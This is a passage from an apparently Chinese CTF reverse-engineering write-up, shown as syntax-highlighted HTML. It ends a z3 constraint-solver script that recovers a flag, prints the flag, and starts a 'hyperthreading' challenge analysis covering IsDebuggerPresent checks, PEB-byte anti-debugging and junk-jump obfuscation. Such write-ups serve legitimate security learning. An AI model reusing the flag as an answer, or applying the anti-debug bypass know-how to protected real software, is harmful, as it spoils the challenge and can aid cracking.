class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">34</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">34</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">34</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> sol<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>
    ret <span class="token operator">=</span> sol<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ret<span class="token punctuation">[</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'oops'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br></div></div><p><code>flag{7e171d43-63b9-4e18-990e-6e14c2afe648}</code></p> <h3 id="hyperthreading"><a href="#hyperthreading" class="header-anchor">#</a> hyperthreading</h3> <p>主函数启动了3个线程，等待了其中的两个。剩下的一个是反调用的：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">IsDebuggerPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;debug!\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>被等待的两个线程对输入的flag进行各种加密处理。比较烦的是代码里<code>jmp $+1</code>、<code>call $+1</code>遍地都是。靠patch可以解决问题，但是要注意<code>call $+1</code>会向栈上推值（<code>$+2</code>），所以就算能patch掉，对栈的异常操作也会导致反编译出问题。</p> <p>反调还没完，两个线程都在不断的读<code>fs:[0x30] + 2</code>处的一个字节，并将其用于算法当中：</p> <div class="language-asm line-numbers-mode"><pre class="language-text"><code>.text:004011B4  mov     ebx, large fs:30h
.text:004011BB  movzx   ebx, byte ptr [ebx+2]
